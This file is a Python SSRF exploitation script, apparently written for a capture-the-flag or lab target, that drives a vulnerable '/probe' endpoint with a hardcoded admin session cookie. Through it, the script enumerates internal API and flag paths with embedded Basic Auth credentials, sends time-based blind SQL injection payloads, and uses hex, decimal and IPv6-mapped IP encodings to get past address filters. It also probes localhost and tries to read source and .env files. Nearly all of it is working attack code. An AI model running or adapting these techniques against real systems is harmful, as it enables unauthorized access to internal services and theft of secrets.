#!/usr/bin/env python3
"""Advanced SSRF exploration v2 for a-16."""
import requests
import re
import html as html_mod

SESSION = "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.amiz9w.0WjzyknMhK0dclFCs8-dT-9hk6I"

def probe(target_url, timeout=10):
    """Send SSRF probe request and return parsed result."""
    try:
        resp = requests.post(
            "http://10.0.174.208:80/probe",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": SESSION,
            },
            data={
                "target_url": target_url,
                "timeout": str(timeout),
                "follow_redirect": "on",
            },
            timeout=timeout + 15,
        )
        text = resp.text
        
        status_match = re.search(r'状态码.*?header-item">(\d+)', text)
        content_len_match = re.search(r'内容长度.*?header-item">([^<]+)', text)
        content_type_match = re.search(r'Content-Type.*?header-item">([^<]+)', text)
        body_match = re.search(r'<pre[^>]*>(.*?)</pre>', text, re.DOTALL)
        error_match = re.search(r'alert-danger[^>]*>(.*?)</div>', text, re.DOTALL)
        
        status = status_match.group(1) if status_match else None
        clen = content_len_match.group(1) if content_len_match else None
        ctype = content_type_match.group(1) if content_type_match else None
        body = ""
        if body_match:
            body = html_mod.unescape(body_match.group(1)).strip()
        error = None
        if error_match:
            error = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
        
        return {"status": status, "len": clen, "type": ctype, "body": body, "error": error}
    except Exception as e:
        return {"error": str(e)}

# Direction: Scan internal-api with Basic Auth
print("=" * 60)
print("DIRECTION: internal-api paths WITH Basic Auth")
print("=" * 60)

auth_paths = [
    "debug/config", "health", "status",
    # Try paths that might exist with auth
    "admin", "admin/config", "admin/users", "admin/dashboard",
    "api", "api/v1", "api/v2",
    "api/v1/query", "api/v1/users", "api/v1/data",
    "query", "db", "database", "execute",
    "internal", "internal/flag", "internal/data",
    "flag", "flags", "secret",
    "config", "config/database", "config/flag",
    "debug", "debug/flag", "debug/query",
    # Try different HTTP methods expressed via URL (won't work with GET, but try)
    "api/query?q=SELECT+*+FROM+flags",
    "api/query?sql=SELECT+*+FROM+flags",
]

print("With Basic Auth (admin:internal_admin_token_2024):")
for path in auth_paths:
    url = f"http://admin:internal_admin_token_2024@0xAC.0x12.0x00.0x02:5000/{path}"
    result = probe(url)
    status = result.get("status", "?")
    body = result.get("body", "")[:80]
    if status and status != "404":
        print(f"  /{path}: {status} | {result.get('len', '-')}B | {body}")
    else:
        if "404" not in body and status != "404":
            print(f"  /{path}: {status} | DIFFERENT: {body}")

# Direction: Try different timeout values for timing-based blind SQLi
print()
print("=" * 60)
print("DIRECTION: Timing-based blind SQLi via URL parameters")
print("=" * 60)

# Try MySQL SLEEP() injected into various parts of the URL
import time as t

# First, baseline timing for /debug/config
print("Baseline timing for /debug/config (3 requests):")
baseline_times = []
for i in range(3):
    start = t.time()
    result = probe("http://0xAC.0x12.0x00.0x02:5000/debug/config")
    elapsed = t.time() - start
    baseline_times.append(elapsed)
    print(f"  Request {i+1}: {elapsed:.3f}s")
avg_baseline = sum(baseline_times) / len(baseline_times)
print(f"  Average: {avg_baseline:.3f}s")

# Now try with SQL sleep payloads in various places
sleep_payloads = [
    ("http://0xAC.0x12.0x00.0x02:5000/debug/config?id=SLEEP(3)", "query param id"),
    ("http://0xAC.0x12.0x00.0x02:5000/debug/config?q='+OR+SLEEP(3)--", "query param q"),
    ("http://0xAC.0x12.0x00.0x02:5000/debug/config?search='+AND+SLEEP(3)--", "query param search"),
    ("http://0xAC.0x12.0x00.0x02:5000/debug/config?test=');SLEEP(3)--", "query param test"),
    # Try in path
    ("http://0xAC.0x12.0x00.0x02:5000/debug/config/SLEEP(3)", "path injection"),
]

for url, desc in sleep_payloads:
    start = t.time()
    result = probe(url, timeout=15)
    elapsed = t.time() - start
    delta = elapsed - avg_baseline
    print(f"  {desc}: {elapsed:.3f}s (delta: {delta:+.3f}s)")

# Direction: Try to exploit URL parser differential for host header injection
print()
print("=" * 60)
print("DIRECTION: URL parser tricks - access internal-api differently")
print("=" * 60)

# Try accessing internal-api via different URL formats
tricks = [
    "http://0xAC.0x12.0x00.0x02:5000/debug/config",
    "http://2865111042:5000/debug/config",  # decimal IP
    "http://172.18.0.2:5000/debug/config",  # direct IP (should be blocked by filter)
    "http://[::ffff:172.18.0.2]:5000/debug/config",  # IPv6 mapped
    "http://0xac120002:5000/debug/config",  # hex without dots
]

for url in tricks:
    result = probe(url)
    if result.get("error"):
        print(f"  {url[:50]}: ERROR - {result['error'][:60]}")
    else:
        print(f"  {url[:50]}: {result.get('status', '?')} | {result.get('body', '')[:60]}")

# Direction: Check if we can access the probe service's own internal endpoints
print()
print("=" * 60)
print("DIRECTION: Probe service self-referencing SSRF")
print("=" * 60)

# Access probe service via itself
self_refs = [
    "http://127.0.0.1:80/",
    "http://localhost:80/",
    "http://0x7F.0x00.0x00.0x01:80/",
    "http://0.0.0.0:80/",
    "http://172.18.0.3:80/",
    "http://0xAC.0x12.0x00.0x03:80/",
    # Try to read probe service source
    "http://0xAC.0x12.0x00.0x03:80/app.py",
    "http://0xAC.0x12.0x00.0x03:80/probe",
    "http://0xAC.0x12.0x00.0x03:80/login",
]

for url in self_refs:
    result = probe(url)
    status = result.get("status", "?")
    body = result.get("body", "")[:80]
    if result.get("error"):
        print(f"  {url[:50]}: ERROR - {result['error'][:60]}")
    else:
        print(f"  {url[:50]}: {status} | {body}")

# Finally: try to find internal-api's app.py or routes
print()
print("=" * 60)
print("DIRECTION: Flask route enumeration tricks")
print("=" * 60)

# Try Flask common debug/internal routes
flask_routes = [
    "/",  # root
    "/.env",
    "/static/",
    "/static/app.py",
    "/templates/",
    "/api",
    "/api/",
    "/swagger",
    "/docs",
    "/openapi.json",
    "/graphql",
    "/graphql?query={__schema{types{name}}}",
    "/api/v1/flag",
    "/api/v1/config",
    "/api/v1/admin",
    # Try SQL injection in path
    "/debug/config' OR '1'='1",
    "/debug/config%27%20OR%20%271%27=%271",
]

for path in flask_routes:
    url = f"http://0xAC.0x12.0x00.0x02:5000{path}"
    result = probe(url)
    status = result.get("status", "?")
    body = result.get("body", "")[:80]
    if status and status != "404":
        print(f"  {path}: {status} | {result.get('len', '-')}B | {body}")
